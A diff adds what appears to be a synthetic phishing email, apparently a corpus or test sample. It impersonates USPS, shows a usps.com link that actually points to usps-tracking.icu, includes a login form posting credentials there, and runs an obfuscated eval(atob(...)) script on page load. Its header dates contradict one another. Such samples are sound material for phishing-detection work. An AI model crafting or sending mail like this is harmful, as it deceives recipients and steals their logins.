@@ -1,0 +1,31 @@
+From: notice@usps-tracking.icu
+To: victim15@example.com
+Subject: Your parcel could not be delivered - click here
+Date: Tue, 24 Mar 2002 19:05:00 -0500
+Message-ID: <phish-15-1d887a9c-606a-4a0c-be58-c9b256cbb4d7@usps-tracking.icu>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 02 Mar 2002 07:04:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 28 Mar 2002 00:29:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 26 Mar 2002 12:18:00 -0500
+Received: from relay3 (relay3.example.net [192.0.2.103]) by mx3.example.com; Tue, 17 Mar 2002 15:16:00 -0500
+Return-Path: <bounce@mail-7575c010.top>
+Reply-To: recovery5@gmail.com
+Authentication-Results: mx.example.com; spf=fail smtp.mailfrom=mail-7575c010.top; dkim=fail header.d=usps-tracking.icu; dmarc=fail header.from=usps-tracking.icu
+Received-SPF: fail (mx.example.com: domain of notice@usps-tracking.icu does not designate 203.0.113.10 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=usps-tracking.icu; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="bnd-p-15-eb3a4f6f"
+
+--bnd-p-15-eb3a4f6f
+Content-Type: text/plain; charset="UTF-8"
+
+Dear customer,
+
+We detected unusual activity on your account. You must verify your account immediately or it will be suspended. Click here to sign in and confirm your identity.
+http://usps-tracking.icu/login
+
+Reference: P40215F
+--bnd-p-15-eb3a4f6f
+Content-Type: text/html; charset="UTF-8"
+
+<html><body onload="track()"><p>Dear customer,<br/><br/>We detected unusual activity on your account. You must verify your account immediately or it will be suspended. Click here to sign in and confirm your identity.<br/>http://usps-tracking.icu/login<br/><br/>Reference: P40215F</p><p><a href="http://usps-tracking.icu/login">https://www.usps.com/signin</a></p><form action="http://usps-tracking.icu/login" method="post"><input type="text" name="user"/><input type="password" name="pass" style="display:none"/><input type="submit" value="Continue"/></form><script>var s="review the notice";eval(atob('qGiGpdKXgULaLYzzeOvIPPXqitsyfzBRIsdOdZOIuowT+gBW+4C3F0EjMTQ9D98D/uzOWHyYtHSjSwieeCRbGpVjZfLZDjVlAgUSBD6u/D19yhJoHnvzeufP3BG1oynVRbmwDJYv7Qdx7ZA9oSzvBMqORsJdqFBNVGw+QxnEnsjd7w5LNM/L4SSCkGR9Ug52IgwEtZQoWrzTtIYlpnJrMQ=='));</script></body></html>
+--bnd-p-15-eb3a4f6f--
